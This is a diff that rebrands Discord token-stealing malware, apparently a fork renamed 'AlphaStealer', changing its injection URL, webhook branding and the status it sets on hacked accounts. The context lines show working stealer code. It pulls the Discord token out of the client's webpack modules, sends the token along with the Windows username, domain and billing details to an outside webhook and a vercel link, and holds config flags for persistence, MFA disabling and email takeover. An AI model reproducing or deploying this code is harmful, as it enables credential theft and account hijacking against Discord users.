@@ -37,7 +37,7 @@ const CONFIG = {
     auto_persist_startup: '%AUTO_PERSIST_STARTUP%',
     auto_mfa_disabler: '%AUTO_MFA_DISABLER%',
     auto_email_update: '%AUTO_EMAIL_UPDATE%',
-    injection_url: 'https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js',
+    injection_url: 'https://raw.githubusercontent.com/alphasquad6666/discord-injection/main/index.js',
     injector_url: 'https://raw.githubusercontent.com/k4itrun/discord-vbs-injector/main/injector.vbs',
     get: {
         token: () => execScript(`(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`),
@@ -250,12 +250,12 @@ const notify = async (ctx, token, user) => {
     ];
 
     ctx.content = `\`${process.env.USERNAME}\` - \`${process.env.USERDOMAIN}\`\n\n${ctx.content}`;
-    ctx.username = `AuraThemes - injection`;
-    ctx.avatar_url = `https://i.imgur.com/CeFqJOc.gif`;
+    ctx.username = `AlphaStealer - Injection`;
+    ctx.avatar_url = `https://imgur.com/zMZNj3D.jpeg`;
 
     ctx.embeds[0].fields.unshift({
-        name: `<a:hearts:1176516454540116090> Token:`,
-        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        name: `<:68602gg:1349774096690315294> Token:`,
+        value: `\`\`\`${token}\`\`\`\n[[Copy Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
         inline: false
     })
 
@@ -298,8 +298,8 @@ const notify = async (ctx, token, user) => {
         };
 
         embed.footer = {
-            text: 'github.com/k4itrun/discord-injection - made by k4itrun',
-            icon_url: "https://avatars.githubusercontent.com/u/103044629",
+            text: 'Developed By AlphaStealer',
+            icon_url: "https://imgur.com/zMZNj3D.jpeg",
         };
 
         embed.timestamp = new Date();
@@ -341,7 +341,7 @@ const editSettingUser = async (token) => {
             email_notifications_enabled: false,
             stream_notifications_enabled: false,
             custom_status: {
-                text: 'hackedbyk4itrun',
+                text: 'RetiredByAlphaSquad',
                 expires_at: null,
                 emoji_id: null,
                 emoji_name: null
@@ -469,8 +469,8 @@ class GetDataUser {
         const data = await API.Billing();
 
         const payment = {
-            1: '💳',
-            2: '<:Paypal:1129073151746252870>'
+            1: '<:Card:1353315910563139594>',
+            2: '<:Paypal:1346174065538367541>'
         };
         let paymentMethods = data.map(method => payment[method.type] || '❓').join('');
         return paymentMethods || '❓';
